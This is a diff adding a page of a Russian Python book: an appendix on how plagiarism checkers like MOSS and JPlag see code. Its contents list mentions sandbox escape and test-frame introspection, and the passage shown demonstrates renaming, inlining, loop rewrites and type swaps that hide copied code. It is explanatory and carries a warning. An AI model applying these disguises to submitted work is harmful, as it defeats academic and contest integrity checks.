+          <li class="md-nav__item">
+  <a href="#minimalnaya" class="md-nav__link">
+    <span class="md-ellipsis">
+      Минимальная защита песочницы
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b6" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.6. Что работает, а что нет — реалистичная оценка
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.6. Что работает, а что нет — реалистичная оценка">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#effektivnost" class="md-nav__link">
+    <span class="md-ellipsis">
+      Эффективность приёмов против разных систем
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#chto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Что точно НЕ стоит делать
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zelenaya" class="md-nav__link">
+    <span class="md-ellipsis">
+      Зелёная зона — что легально и эффективно
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendix-c-code-golf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C. Code golf
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendix-d-references/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    D. Где почитать
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#b1" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.1. Косметические приёмы — обман на уровне токенов
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.1. Косметические приёмы — обман на уровне токенов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pereimenovanie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Переименование идентификаторов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#inlining" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inlining / outlining
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#izmenenie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Изменение управляющих конструкций
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zamena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена типов данных
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mertvyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Мёртвый код (dead code insertion)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zamena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена библиотек
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#arifmeticheskie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Арифметические эквиваленты
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b2" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.2. Архитектурные приёмы — перенос логики в рантайм
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.2. Архитектурные приёмы — перенос логики в рантайм">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotatsii" class="md-nav__link">
+    <span class="md-ellipsis">
+      Аннотации как данные
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setattr" class="md-nav__link">
+    <span class="md-ellipsis">
+      setattr для динамических атрибутов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#compile" class="md-nav__link">
+    <span class="md-ellipsis">
+      compile + exec — код из строки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typesfunctiontype" class="md-nav__link">
+    <span class="md-ellipsis">
+      types.FunctionType + types.CodeType — сборка функции из байт-кода
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#type" class="md-nav__link">
+    <span class="md-ellipsis">
+      type() — динамическое создание классов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kombinirovannyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Комбинированный коктейль
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b3-ctypes" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.3. Перехват аргументов через фреймы и ctypes
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.3. Перехват аргументов через фреймы и ctypes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sysgetframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      sys._getframe — чтение локальных переменных вызывающего
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ctypespythonapipyframelocalstofast" class="md-nav__link">
+    <span class="md-ellipsis">
+      ctypes.pythonapi.PyFrame_LocalsToFast — запись изменений обратно
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#podmena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подмена co_name / co_filename
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#chtenie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Чтение данных из фрейма тестирующего
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b4" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.4. Интроспекция окружения тестирующих систем
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.4. Интроспекция окружения тестирующих систем">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#universalnyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Универсальный «комбайн» — собрать всё в JSON
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#konkretnye" class="md-nav__link">
+    <span class="md-ellipsis">
+      Конкретные проверки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zaschita" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита тестирующих систем
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b5-__subclasses__" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.5. Песочницы и обход через __subclasses__()
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.5. Песочницы и обход через __subclasses__()">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tsepochka" class="md-nav__link">
+    <span class="md-ellipsis">
+      Цепочка: ().__class__.__base__.__subclasses__()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poisk" class="md-nav__link">
+    <span class="md-ellipsis">
+      Поиск класса с доступом к os
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#universalnyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Универсальный «finder» — найти любой модуль в __subclasses__
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alternativnye" class="md-nav__link">
+    <span class="md-ellipsis">
+      Альтернативные пути обхода
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zaschita" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита: почему это сложно заблокировать
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#minimalnaya" class="md-nav__link">
+    <span class="md-ellipsis">
+      Минимальная защита песочницы
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b6" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.6. Что работает, а что нет — реалистичная оценка
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.6. Что работает, а что нет — реалистичная оценка">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#effektivnost" class="md-nav__link">
+    <span class="md-ellipsis">
+      Эффективность приёмов против разных систем
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#chto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Что точно НЕ стоит делать
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zelenaya" class="md-nav__link">
+    <span class="md-ellipsis">
+      Зелёная зона — что легально и эффективно
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+    <a href="https://github.com/n3xumc0r3/py-underhood/edit/main/book/appendix-b-code-checkers.md" title="Редактировать страницу" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/n3xumc0r3/py-underhood/raw/main/book/appendix-b-code-checkers.md" title="Посмотреть исходный код страницы" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="b">Приложение B. Взаимодействие с системами проверки кода (контекст)<a class="headerlink" href="#b" title="Permanent link">#</a></h1>
+<blockquote>
+<p>Это приложение — <strong>контекстное</strong>: приёмы, которые применяются к системам проверки кода (MOSS, JPlag, Dolos, Codequiry). Цель — не инструкция, а понимание того, <strong>что эти системы видят</strong> и <strong>что не видят</strong>. Основной фокус конспекта — на скрытых возможностях языка; системы проверки здесь — как прикладная область, где эти возможности становятся инструментами.</p>
+<p>⚠️ <strong>Не используйте эти приёмы в реальных тестирующих системах.</strong> Применение техник из этого раздела в учебных или соревновательных окружениях нарушает правила этих систем и может привести к дисциплинарным последствиям. Материал представлен исключительно для понимания механики работы систем проверки и проектирования защиты.</p>
+<p>Подробнее про механизмы детекции — см. <strong>Приложение A</strong>.</p>
+</blockquote>
+<h2 id="b1">B.1. Косметические приёмы — обман на уровне токенов<a class="headerlink" href="#b1" title="Permanent link">#</a></h2>
+<p>Косметические приёмы меняют <strong>внешний вид</strong> кода, не меняя логику. Они работают на уровне токенов и AST-узлов — ломают k-граммы и хеш-винновинг (см. A.1), но <strong>легко детектируются</strong> AST-нормализацией (A.5).</p>
+<h3 id="pereimenovanie">Переименование идентификаторов<a class="headerlink" href="#pereimenovanie" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Оригинал:</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">def</span> <span class="nf">calculate_total_price</span><span class="p">(</span><span class="n">items</span><span class="p">,</span> <span class="n">discount</span><span class="p">):</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    <span class="n">subtotal</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">item</span><span class="o">.</span><span class="n">price</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">)</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    <span class="k">return</span> <span class="n">subtotal</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">discount</span> <span class="o">/</span> <span class="mi">100</span><span class="p">)</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># Косметика — все имена заменены:</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="n">c</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">p</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">)</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="k">return</span> <span class="n">c</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">b</span> <span class="o">/</span> <span class="mi">100</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Эффективность</strong>: низкая. MOSS и JPlag токенизируют код — <code>IDENTIFIER</code> заменяет все имена. <code>calculate_total_price</code> и <code>f</code> — одинаковый токен <code>IDENTIFIER</code>.</p>
+<h3 id="inlining">Inlining / outlining<a class="headerlink" href="#inlining" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Оригинал — три функции:</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="k">def</span> <span class="nf">validate</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">100</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="n">n</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    <span class="k">if</span> <span class="n">validate</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="n">n</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># Inlining — всё в одной функции:</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">:</span> <span class="k">return</span> <span class="n">n</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># Outlining — разбивка на ещё больше функций:</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="k">def</span> <span class="nf">_to_int</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="k">def</span> <span class="nf">_check_range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">100</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="k">def</span> <span class="nf">_double</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="n">n</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>    <span class="n">n</span> <span class="o">=</span> <span class="n">_to_int</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>    <span class="k">if</span> <span class="n">_check_range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="k">return</span> <span class="n">_double</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Эффективность</strong>: средняя. Меняет AST-структуру (количество <code>FunctionDef</code> узлов), но нормализаторы MOSS/JPlag сливают inline-функции обратно.</p>
+<h3 id="izmenenie">Изменение управляющих конструкций<a class="headerlink" href="#izmenenie" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Оригинал — for + if:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># Вариант 1 — while вместо for:</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="n">result</span> <span class="o">=</span> <span class="p">[];</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>    <span class="n">x</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>    <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="c1"># Вариант 2 — list comprehension:</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="o">*</span> <span class="mi">2</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span> <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">]</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="c1"># Вариант 3 — filter + map:</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)))</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="c1"># Вариант 4 — инверсия условия:</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>    <span class="k">if</span> <span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span> <span class="k">continue</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>    <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Эффективность</strong>: средняя. Меняет тип AST-узла (<code>For</code> → <code>While</code>, <code>For</code> → <code>ListComp</code>), но семантика та же. AST-нормализаторы (A.5) сводят все варианты к канонической форме.</p>
+<h3 id="zamena">Замена типов данных<a class="headerlink" href="#zamena" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Оригинал — list:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Вариант — tuple:</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Вариант — set:</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">}</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># Вариант — dict keys:</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="n">data</span> <span class="o">=</span> <span class="nb">dict</span><span class="o">.</span><span class="n">fromkeys</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">])</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="c1"># или в 3.7+ — dict сохраняет порядок</span>
+</span></code></pre></div>
+<h3 id="mertvyy">Мёртвый код (dead code insertion)<a class="headerlink" href="#mertvyy" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Оригинал:</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="k">return</span> <span class="n">n</span> <span class="o">*</span> <span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1"># С мёртвым кодом:</span>
